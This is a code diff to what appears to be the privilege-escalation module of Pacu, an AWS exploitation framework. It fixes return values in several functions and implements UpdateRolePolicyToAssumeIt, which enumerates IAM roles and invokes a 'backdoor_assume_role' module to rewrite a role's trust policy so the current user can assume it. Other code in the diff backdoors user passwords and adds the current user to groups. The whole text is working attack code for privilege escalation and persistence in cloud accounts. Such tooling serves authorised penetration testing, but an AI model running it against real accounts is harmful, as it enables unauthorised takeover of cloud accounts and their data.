@@ -1056,6 +1056,7 @@ def UpdateLoginProfile(pacu_main, print, input, fetch_data):
             fetch_data(None, 'backdoor_users_password', '--update --usernames {}'.format(user_string), force=True)
         else:
             fetch_data(None, 'backdoor_users_password', '--update --usernames {}'.format(username), force=True)
+        return True
     except Exception as e:
         print('      Failed to update the login profile for user {}: {}'.format(username, e))
         again = input('    Do you want to try another user (y) or continue to the next privilege escalation method (n)? ')
@@ -1064,7 +1065,6 @@ def UpdateLoginProfile(pacu_main, print, input, fetch_data):
             return UpdateLoginProfile(pacu_main, print, input, fetch_data)
         else:
             return False
-    return True
 
 
 def AttachUserPolicy(pacu_main, print, input, fetch_data):
@@ -1141,7 +1141,7 @@ def AttachRolePolicy(pacu_main, print, input, fetch_data):
     if not target_role:
         if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles', force=True) is False:
             print('Pre-req module not run successfully. Exiting...')
-            return
+            return False
         roles = deepcopy(session.IAM['Roles'])
 
         print('Found {} roles. Choose one below.'.format(len(roles)))
@@ -1232,7 +1232,7 @@ def PutRolePolicy(pacu_main, print, input, fetch_data):
     if not target_role:
         if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles', force=True) is False:
             print('Pre-req module not run successfully. Exiting...')
-            return
+            return False
         roles = deepcopy(session.IAM['Roles'])
 
         print('Found {} roles. Choose one below.'.format(len(roles)))
@@ -1268,7 +1268,7 @@ def AddUserToGroup(pacu_main, print, input, fetch_data):
     if group_name == '':
         if fetch_data(['IAM', 'Groups'], 'enum_users_roles_policies_groups', '--groups') is False:
             print('Pre-req module not run successfully. Exiting...')
-            return
+            return False
         groups = session.IAM['Groups']
         print('Found {} group(s). Choose a group below.'.format(len(groups)))
         print('  [0] Other (Manually enter group name)')
@@ -1287,6 +1287,7 @@ def AddUserToGroup(pacu_main, print, input, fetch_data):
             UserName=active_aws_key['UserName']
         )
         print('  Successfully added the current user to the group {}! You should now have access to the permissions associated with that group.'.format(group_name))
+        return True
     except Exception as e:
         print('  Failed to add the current user to the group {}:\n{}'.format(group_name, e))
         again = input('    Do you want to try again with a different group (y) or continue to the next privilege escalation method (n)? ')
@@ -1295,11 +1296,43 @@ def AddUserToGroup(pacu_main, print, input, fetch_data):
             return AddUserToGroup(pacu_main, print, input, fetch_data)
         else:
             return False
-    return True
 
 
 def UpdateRolePolicyToAssumeIt(pacu_main, print, input, fetch_data):
-    return
+    session = pacu_main.get_active_session()
+
+    print('  Starting method UpdateRolePolicyToAssumeIt...\n')
+
+    client = pacu_main.get_boto3_client('iam')
+
+    target_role = input('    Is there a specific role to target? Enter the name now or just press enter to enumerate a list of possible roles to choose from: ')
+
+    if not target_role:
+        if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles', force=True) is False:
+            print('Pre-req module not run successfully. Exiting...')
+            return False
+        roles = deepcopy(session.IAM['Roles'])
+
+        print('Found {} roles. Choose one below.'.format(len(roles)))
+        for i in range(0, len(roles)):
+            print('  [{}] {}'.format(i, roles[i]['RoleName']))
+        choice = input('Choose an option: ')
+        target_role = roles[int(choice)]['RoleName']
+
+    print('Targeting role {}. Trying to backdoor access to it from the current user...'.format(target_role))
+
+    try:
+        if fetch_data(['Backdooring Roles'], 'backdoor_assume_role', '--role-names {}'.format(target_role), force=True) is False:
+            print('Pre-req module not run successfully. Exiting...')
+            return False
+    except Exception as error:
+        print('Failed to update the assume-role-policy-document for role {}: {}\n'.format(target_role, error))
+        again = input('    Do you want to try another role (y) or continue to the next privilege escalation method (n)? ')
+        if again == 'y':
+            print('      Re-running UpdateRolePolicyToAssumeIt privilege escalation attempt...')
+            return UpdateRolePolicyToAssumeIt(pacu_main, print, input, fetch_data)
+        else:
+            return False
 
 
 def PassExistingRoleToNewLambdaThenInvoke(pacu_main, print, input, fetch_data):
